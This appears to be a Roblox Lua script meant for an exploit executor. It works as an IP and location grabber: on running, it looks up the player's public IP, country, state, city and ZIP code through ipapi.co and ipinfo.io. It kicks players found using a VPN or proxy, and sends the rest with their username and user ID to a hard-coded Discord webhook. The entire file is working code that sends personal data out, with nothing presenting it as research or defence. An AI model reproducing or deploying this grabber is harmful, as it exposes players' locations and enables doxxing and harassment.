local HttpService = game:GetService("HttpService")
local Webhook = "https://discord.com/api/webhooks/1350529472985829527/fDDdI8oxSlhco9JpY5ZqZKI5_Fbx85ZizeYq9Pcwym9kFn2THSNx1Jug_2DcECiZCxsR‚Äù

local function sendToWebhook()
    local player = game.Players.LocalPlayer
    local username = player.Name
    local userId = player.UserId

    local success, country = pcall(function()
        return game:HttpGet("https://ipapi.co/country_name/")
    end)

    local stateSuccess, state = pcall(function()
        return game:HttpGet("https://ipapi.co/region/")
    end)

    local citySuccess, city = pcall(function()
        return game:HttpGet("https://ipapi.co/city/")
    end)

    local zipSuccess, zip = pcall(function()
        return game:HttpGet("https://ipapi.co/postal/")
    end)

    local ipSuccess, ip = pcall(function()
        return game:HttpGet("https://ipinfo.io/ip")
    end)

    local vpnSuccess, isVPN = pcall(function()
        return game:HttpGet("https://ipapi.co/" .. ip .. "/json/")
    end)

    if not success then country = "Unknown" end
    if not stateSuccess then state = "Unknown" end
    if not citySuccess then city = "Unknown" end
    if not zipSuccess then zip = "Unknown" end
    if not ipSuccess then ip = "Unknown" end
    if not vpnSuccess then isVPN = "Unknown" end

   if vpnSuccess then
        local vpnData = HttpService:JSONDecode(isVPN)
        if vpnData["proxy"] == true or vpnData["vpn"] == true then
            isVPN = "Yes"
            player:Kick("Error")
            return
        else
            isVPN = "No"
        end
    else
        isVPN = "Unknown"
    end

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {{
            ["title"] = "Player info",
            ["color"] = 255,
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
                {["name"] = "Country", ["value"] = country, ["inline"] = true},
                {["name"] = "State", ["value"] = state, ["inline"] = true},
                {["name"] = "City", ["value"] = city, ["inline"] = true},
                {["name"] = "ZIP Code", ["value"] = zip, ["inline"] = true},
                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "VPN?", ["value"] = isVPN, ["inline"] = true}
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })

    print("Webhook response:", response.StatusCode)
end

sendToWebhook()